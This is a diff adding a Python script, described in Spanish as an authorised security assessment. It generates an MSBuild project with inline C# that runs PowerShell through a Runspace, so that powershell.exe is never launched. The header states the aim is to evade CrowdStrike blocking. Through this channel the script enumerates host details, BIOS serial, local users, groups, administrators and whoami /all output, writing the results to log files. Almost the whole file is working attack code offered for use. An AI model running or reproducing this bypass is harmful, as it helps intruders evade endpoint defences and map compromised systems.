@@ -1,0 +1,226 @@
+"""
+ps_msbuild_recon.py — Validacion bypass MSBuild + PS Runspace
+Evaluacion de seguridad autorizada.
+
+Tecnica: MSBuild.exe + C# inline task -> PowerShell Runspace
+         Sin lanzar powershell.exe — evade bloqueo CrowdStrike.
+
+Genera: ps_recon_log.txt  y  ps_recon_output.txt
+"""
+
+import os
+import sys
+import subprocess
+import tempfile
+import time
+import traceback
+import threading
+from datetime import datetime
+from pathlib import Path
+
+LOG_PATH = Path(__file__).parent / "ps_recon_log.txt"
+OUT_PATH = Path(__file__).parent / "ps_recon_output.txt"
+_lf      = None
+_lock    = threading.Lock()
+
+def L(msg):
+    ts   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+    line = f"[{ts}] {msg}"
+    print(line)
+    with _lock:
+        if _lf:
+            _lf.write(line + "\n")
+            _lf.flush()
+
+def SEP(t=""):
+    bar = f"── {t} " if t else "──"
+    L(bar + "─" * max(0, 54 - len(bar)))
+
+MSBUILD_PATHS = [
+    r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
+    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
+    r"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe",
+    r"C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\MSBuild.exe",
+]
+
+def find_msbuild():
+    return next((p for p in MSBUILD_PATHS if os.path.exists(p)), None)
+
+def run_ps_via_msbuild(ps_script, timeout_s=45):
+    msbuild  = find_msbuild()
+    if not msbuild:
+        return False, "MSBuild no encontrado"
+
+    tmp_out  = tempfile.NamedTemporaryFile(suffix=".txt", delete=False, mode="w")
+    tmp_out.close()
+    out_path = tmp_out.name.replace("\\", "\\\\")
+    ps_esc   = ps_script.replace("\\", "\\\\").replace('"', '\\"')
+
+    xml = f"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Run"><ReconTask /></Target>
+  <UsingTask TaskName="ReconTask" TaskFactory="CodeTaskFactory"
+             AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs"><![CDATA[
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        using System.Management.Automation;
+        using System.Management.Automation.Runspaces;
+        using System.Text;
+        using System.IO;
+        public class ReconTask : Task {{
+          public override bool Execute() {{
+            var sb = new StringBuilder();
+            try {{
+              using (Runspace rs = RunspaceFactory.CreateRunspace()) {{
+                rs.Open();
+                using (Pipeline p = rs.CreatePipeline()) {{
+                  p.Commands.AddScript("{ps_esc}");
+                  p.Commands.Add("Out-String");
+                  foreach (var r in p.Invoke()) sb.AppendLine(r.ToString());
+                  if (p.Error.Count > 0)
+                    foreach (var e in p.Error.ReadToEnd()) sb.AppendLine(e.ToString());
+                }}
+              }}
+            }} catch (System.Exception ex) {{
+              sb.AppendLine("EXCEPCION: " + ex.Message);
+            }}
+            File.WriteAllText(@"{out_path}", sb.ToString(), Encoding.UTF8);
+            return true;
+          }}
+        }}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>"""
+
+    proj = tempfile.NamedTemporaryFile(suffix=".proj", delete=False,
+                                       mode="w", encoding="utf-8")
+    proj.write(xml)
+    proj.close()
+
+    try:
+        r = subprocess.run(
+            [msbuild, proj.name, "/nologo", "/verbosity:quiet"],
+            capture_output=True, text=True, timeout=timeout_s,
+            shell=False, encoding="utf-8", errors="replace"
+        )
+        if r.returncode != 0:
+            L(f"  MSBuild error rc={r.returncode}: {r.stderr.strip()[:200]}")
+        time.sleep(0.5)
+        result = ""
+        try:
+            result = Path(tmp_out.name).read_text(encoding="utf-8", errors="replace").strip()
+        except Exception:
+            pass
+        return bool(result), result
+    except subprocess.TimeoutExpired:
+        return False, "TimeoutExpired"
+    except Exception as e:
+        return False, str(e)
+    finally:
+        try: os.unlink(proj.name)
+        except: pass
+        try: os.unlink(tmp_out.name)
+        except: pass
+
+BLOQUES = [
+    ("Sistema_Base", """
+$os = Get-CimInstance Win32_OperatingSystem
+$cs = Get-CimInstance Win32_ComputerSystem
+$bios = Get-CimInstance Win32_BIOS
+[PSCustomObject]@{
+    Hostname       = $env:COMPUTERNAME
+    Usuario        = $env:USERNAME
+    Dominio        = $env:USERDOMAIN
+    OS             = $os.Caption
+    Build          = $os.BuildNumber
+    Arquitectura   = $os.OSArchitecture
+    RAM_GB         = [math]::Round($cs.TotalPhysicalMemory/1GB,1)
+    Fabricante     = $cs.Manufacturer
+    Modelo         = $cs.Model
+    SerialBIOS     = $bios.SerialNumber
+    UltimoArranque = $os.LastBootUpTime
+    PSVersion      = $PSVersionTable.PSVersion.ToString()
+    CLR            = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
+    ProcesoPadre   = (Get-Process -Id $PID).Name
+    PID_actual     = $PID
+} | Format-List
+"""),
+
+    ("Usuarios_y_Grupos", """
+Write-Output "=== USUARIOS LOCALES ==="
+Get-LocalUser | Select-Object Name,Enabled,LastLogon,PasswordRequired,PasswordExpires | Format-Table -AutoSize
+
+Write-Output "`n=== GRUPOS LOCALES ==="
+Get-LocalGroup | Select-Object Name,Description | Format-Table -AutoSize
+
+Write-Output "`n=== MIEMBROS DE ADMINISTRADORES ==="
+Get-LocalGroupMember -Group "Administradores" 2>$null
+Get-LocalGroupMember -Group "Administrators" 2>$null
+
+Write-Output "`n=== WHOAMI /ALL ==="
+& whoami /all 2>&1
+"""),
+]
+
+def main():
+    global _lf
+    _lf = open(LOG_PATH, "w", encoding="utf-8", buffering=1)
+
+    L(f"=== ps_msbuild_recon.py {datetime.now()} ===")
+    L(f"PID     : {os.getpid()}")
+    L(f"Usuario : {os.environ.get('USERNAME','?')}@{os.environ.get('USERDOMAIN','?')}")
+    L(f"Python  : {sys.version.split()[0]}")
+
+    if sys.platform != "win32":
+        L("ABORTAR: requiere Windows")
+        input("Enter para salir...")
+        return
+
+    msbuild = find_msbuild()
+    if not msbuild:
+        L("ERROR: MSBuild.exe no encontrado")
+        input("Enter para salir...")
+        return
+    L(f"MSBuild : {msbuild}")
+
+    out_lines = [
+        "TSI Security Assessment — Bypass MSBuild PS Runspace",
+        f"Fecha   : {datetime.now()}",
+        f"Equipo  : {os.environ.get('COMPUTERNAME','?')}",
+        f"Usuario : {os.environ.get('USERNAME','?')}@{os.environ.get('USERDOMAIN','?')}",
+        "Tecnica : MSBuild.exe + C# inline -> PowerShell Runspace (sin powershell.exe)",
+        "=" * 70,
+        "",
+    ]
+
+    exitosos = 0
+    for i, (name, script) in enumerate(BLOQUES, 1):
+        SEP(f"{i}/{len(BLOQUES)} {name}")
+        try:
+            ok, output = run_ps_via_msbuild(script)
+            if ok:
+                L(f"  OK — {len(output)} chars")
+                exitosos += 1
+                out_lines += [f"\n{'='*70}", f"  {name}", f"{'='*70}", output]
+            else:
+                L(f"  SIN OUTPUT — {output[:100]}")
+                out_lines.append(f"\n[{name}] sin output: {output[:100]}")
+        except Exception:
+            L(f"  EXCEPCION: {traceback.format_exc()}")
+
+    OUT_PATH.write_text("\n".join(out_lines), encoding="utf-8")
+
+    SEP("RESUMEN")
+    L(f"Exitosos : {exitosos}/{len(BLOQUES)}")
+    L(f"Output   : {OUT_PATH}")
+    L(f"Tecnica  : powershell.exe nunca fue lanzado")
+
+    if _lf:
+        _lf.close()
+    input("\nEnter para cerrar...")
+
+if __name__ == "__main__":
+    main()
